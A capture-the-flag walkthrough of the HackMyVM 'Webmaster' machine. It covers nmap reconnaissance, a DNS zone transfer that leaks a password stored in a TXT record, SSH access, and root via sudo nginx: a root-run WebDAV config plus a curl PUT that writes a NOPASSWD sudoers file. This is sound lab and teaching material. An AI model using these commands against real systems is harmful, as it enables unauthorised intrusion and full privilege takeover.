# Webmaster

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Webmaster | sml | Beginner | HackMyVM |

**Summary:** Webmaster is a beginner-level vulnerable machine hosted on HackMyVM that demonstrates a common DNS misconfiguration vulnerability combined with weak service permissions. The attack path begins with discovering a DNS zone transfer vulnerability (AXFR) that exposes sensitive user credentials in TXT records. After gaining initial SSH access as a low-privileged user, privilege escalation is achieved by exploiting unrestricted sudo permissions on the Nginx web server binary. By creating a malicious Nginx configuration file that enables WebDAV with full filesystem access running as root, an attacker can modify the `/etc/sudoers.d/` directory to grant themselves full root privileges. This machine highlights the importance of proper DNS configuration, secure credential management, and the principle of least privilege when granting sudo permissions.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying live hosts on the target network. Using a custom PowerShell scanning script, the target was identified on the network:

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.62 08:00:27:C6:C9:BB VirtualBox
```

The scan reveals a VirtualBox machine at **192.168.100.62** with MAC address `08:00:27:C6:C9:BB`, confirming this is our target.

### Port Scanning

#### TCP Port Scan

A comprehensive TCP port scan was performed using Nmap to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ nmap -sC -sV -p- 192.168.100.62
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 20:17 WIB
Nmap scan report for 192.168.100.62
Host is up (0.0035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid:
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.75 seconds
```

**Key Findings:**
- **Port 22/TCP** - OpenSSH 7.9p1 (Debian 10+deb10u2)
- **Port 53/TCP** - DNS service (Eero device dnsd)
- **Port 80/TCP** - Nginx 1.14.2 web server

The presence of port 53 (DNS) on TCP is particularly interesting, as this often indicates DNS zone transfer capabilities.

#### UDP Port Scan

Since DNS typically operates on UDP as well, a UDP port scan was performed to identify additional services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ nmap -sU --top-ports 100 192.168.100.62
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 20:16 WIB
Nmap scan report for 192.168.100.62
Host is up (0.068s latency).
Not shown: 56 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 55.62 seconds
```

**Port 53/UDP** is confirmed open, which is standard for DNS services.

### Web Service Enumeration

#### Initial HTTP Analysis

The web server was probed to gather HTTP headers and identify the web content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ curl -I http://192.168.100.62
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 02 Feb 2026 13:21:04 GMT
Content-Type: text/html
Content-Length: 57
Last-Modified: Sat, 05 Dec 2020 09:48:55 GMT
Connection: keep-alive
ETag: "5fcb5787-39"
Accept-Ranges: bytes
```

The headers confirm **Nginx 1.14.2** is running. Retrieving the page content reveals an HTML comment with a domain name:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ curl http://192.168.100.62
 <img src="comic.png" alt="comic">
<!--webmaster.hmv-->
```

The HTML source contains:
- An image reference to `comic.png`
- A **hidden HTML comment** revealing the domain: `webmaster.hmv`

This domain name is a critical discovery, as it suggests the machine is configured with a hostname that may be used for DNS queries.

#### Hostname Configuration

To properly interact with the DNS service and web server, the domain was added to the local `/etc/hosts` file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ echo '192.168.100.62 webmaster.hmv' | sudo tee -a /etc/hosts
192.168.100.62 webmaster.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ cat /etc/hosts | grep 192.168.100.62
192.168.100.62 webmaster.hmv
```

---

## Initial Access

### DNS Zone Transfer (AXFR) Vulnerability

With the domain name `webmaster.hmv` identified, the next logical step was to test for DNS zone transfer vulnerability. A zone transfer (AXFR) is a DNS query that should only be allowed to authorized secondary DNS servers, but misconfigurations often allow anyone to request a full copy of all DNS records.

Using the `dig` command to request a zone transfer:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ dig axfr webmaster.hmv @192.168.100.62                                 
; <<>> DiG 9.20.15-2-Debian <<>> axfr webmaster.hmv @192.168.100.62
;; global options: +cmd
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.
ftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.
john.webmaster.hmv.     604800  IN      TXT     "My[REDACTED]"
mail.webmaster.hmv.     604800  IN      A       192.168.0.12
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1
www.webmaster.hmv.      604800  IN      A       192.168.0.11
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.100.62#53(192.168.100.62) (TCP)
;; WHEN: Mon Feb 02 20:23:32 WIB 2026
;; XFR size: 8 records (messages 1, bytes 274)
```

**Critical Discovery:** The DNS server allowed an unauthenticated zone transfer, exposing the entire DNS zone. Among the records, there is a **TXT record** for `john.webmaster.hmv` containing what appears to be a password: `"My[REDACTED]"`

**DNS Records Discovered:**
- **SOA Record**: ns1.webmaster.hmv / root.webmaster.hmv
- **NS Record**: ns1.webmaster.hmv
- **CNAME**: ftp.webmaster.hmv → www.webmaster.hmv
- **TXT Record**: john.webmaster.hmv → `"My[REDACTED]"` *(This is the password!)*
- **A Record**: mail.webmaster.hmv → 192.168.0.12
- **A Record**: ns1.webmaster.hmv → 127.0.0.1
- **A Record**: www.webmaster.hmv → 192.168.0.11

The TXT record associated with "john" is highly suspicious. TXT records are often used for verification purposes, but storing passwords in DNS is a severe security misconfiguration. This suggests the credentials are:
- **Username**: `john`
- **Password**: `My[REDACTED]` (extracted from TXT record)

### SSH Access as John

Using the discovered credentials, SSH access was attempted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ ssh john@192.168.100.62
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
john@192.168.100.62's password:
Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
...
john@webmaster:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
john@webmaster:~$ ls -la
total 36
drwxr-xr-x 3 john john 4096 Dec  5  2020 .
drwxr-xr-x 3 root root 4096 Dec  4  2020 ..
-rw-r--r-- 1 john john  220 Dec  4  2020 .bash_logout
-rw-r--r-- 1 john john 3526 Dec  4  2020 .bashrc
-rwxr-xr-x 1 john john 1920 Dec  5  2020 flag.sh
drwxr-xr-x 3 john john 4096 Dec  5  2020 .local
-rw-r--r-- 1 john john  807 Dec  4  2020 .profile
-rw------- 1 john john    9 Dec  5  2020 user.txt
-rw------- 1 john john  110 Dec  5  2020 .Xauthority
```

**Success!** The credentials worked, granting shell access as the user `john`. The home directory contains:
- **user.txt** - The user flag (permissions: 600)
- **flag.sh** - An executable shell script (likely displays flag or provides hints)
- Standard Linux user configuration files (.bashrc, .profile, etc.)

The user `john` is a member of several groups including `cdrom`, `audio`, `video`, `plugdev`, and `netdev`, but none of these appear immediately exploitable.

---

## Privilege Escalation

### Sudo Permissions Enumeration

The first step in privilege escalation on Linux systems is checking for sudo permissions:

```bash
john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

**Critical Finding:** User `john` has permission to run `/usr/sbin/nginx` as root **without a password** (`NOPASSWD`). This is a significant misconfiguration because:

1. **Nginx runs as root** when started with sudo
2. **Nginx can be configured** to serve any files on the filesystem
3. **Nginx supports WebDAV**, which allows file uploads and modifications
4. A custom configuration file can be specified with the `-c` flag

### Nginx Exploitation Strategy

The exploitation approach leverages Nginx's WebDAV functionality to gain write access to privileged directories:

1. Create a malicious Nginx configuration that runs as root
2. Enable WebDAV with PUT method to allow file uploads
3. Set the root directory to `/` (entire filesystem)
4. Start Nginx with this configuration on a different port (8080)
5. Use WebDAV to upload a malicious sudoers configuration
6. Gain full root access via sudo

### Creating the Malicious Nginx Configuration

A custom Nginx configuration file was created at `/tmp/read.conf`:

```bash
john@webmaster:~$ cat > /tmp/read.conf <<EOF
> user root;
> worker_processes 1;
> events { worker_connections 1024; }
> http {
>     server {
>         listen 8080;
>         location / {
>             root /;
>             dav_methods PUT DELETE MKCOL COPY MOVE;
>             create_full_put_path on;
>             dav_access user:rw group:rw all:r;
>             allow all;
>         }
>     }
> }
> EOF
```

**Configuration Breakdown:**
- `user root;` - Forces Nginx worker processes to run as root
- `listen 8080;` - Binds to port 8080 (avoids conflict with existing web server on port 80)
- `root /;` - Sets document root to `/`, exposing the entire filesystem
- `dav_methods PUT DELETE MKCOL COPY MOVE;` - Enables WebDAV methods for file manipulation
- `create_full_put_path on;` - Allows creation of parent directories when uploading files
- `dav_access user:rw group:rw all:r;` - Sets file permissions for uploaded files
- `allow all;` - Permits access from any IP address

### Starting the Malicious Nginx Instance

The custom Nginx configuration was loaded using sudo privileges:

```bash
john@webmaster:~$ sudo /usr/sbin/nginx -c /tmp/read.conf
john@webmaster:~$ ss -tulpan | grep 8080
tcp    LISTEN      0       128             0.0.0.0:8080          0.0.0.0:*
```

The `ss` command confirms that Nginx is now listening on port 8080. Since this Nginx instance is running as root and has WebDAV enabled with full filesystem access, we can now modify any file on the system.

### Exploiting WebDAV to Escalate Privileges

#### Creating a Malicious Sudoers Entry

From the attacking machine, a malicious sudoers entry was created:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ echo "john ALL=(ALL) NOPASSWD: ALL" > john_pwn
```

This sudoers rule grants user `john` the ability to run **any command** as **any user** (including root) **without a password**.

#### Uploading the Malicious Sudoers File

The file was uploaded to `/etc/sudoers.d/john` using the WebDAV PUT method via curl:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/webmaster]
└─$ curl -X PUT http://webmaster.hmv:8080/etc/sudoers.d/john --data-binary @john_pwn
```

**Why this works:**
- The Nginx server is running as **root** (due to `user root;` directive)
- WebDAV PUT method is enabled
- The target path `/etc/sudoers.d/john` is writable by the Nginx process (root)
- Files in `/etc/sudoers.d/` are automatically parsed by sudo

### Gaining Root Access

With the malicious sudoers file in place, obtaining a root shell is trivial:

```bash
john@webmaster:~$ sudo -i
root@webmaster:~# id ; hostname ; whoami
uid=0(root) gid=0(root) groups=0(root)
webmaster
root
root@webmaster:~# cat /home/john/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

**pwned!**

---

## Attack Chain Summary

1. **Reconnaissance**: Identified target at 192.168.100.62 with open ports 22/SSH, 53/DNS, and 80/HTTP (Nginx 1.14.2). HTML comment on web server revealed domain name `webmaster.hmv`.

2. **Vulnerability Discovery**: Performed DNS zone transfer (AXFR) against `webmaster.hmv`, exposing all DNS records including a TXT record for user `john` containing a plaintext password stored in the DNS zone.

3. **Exploitation**: Used discovered credentials (`john`/`My[REDACTED]`) to authenticate via SSH and gain initial foothold as low-privileged user `john`.

4. **Internal Enumeration**: Executed `sudo -l` to discover that user `john` has NOPASSWD sudo rights to execute `/usr/sbin/nginx` as root, presenting a clear privilege escalation vector.

5. **Privilege Escalation**: Created a malicious Nginx configuration file enabling WebDAV with full filesystem access running as root user. Started rogue Nginx instance on port 8080, then used WebDAV PUT method to upload a malicious sudoers configuration file to `/etc/sudoers.d/john`, granting unrestricted sudo access. Executed `sudo -i` to obtain interactive root shell and retrieved both user and root flags.

---

**Key Vulnerabilities**:
- Unrestricted DNS zone transfer (AXFR)
- Plaintext credentials stored in DNS TXT records
- Overly permissive sudo configuration for Nginx binary
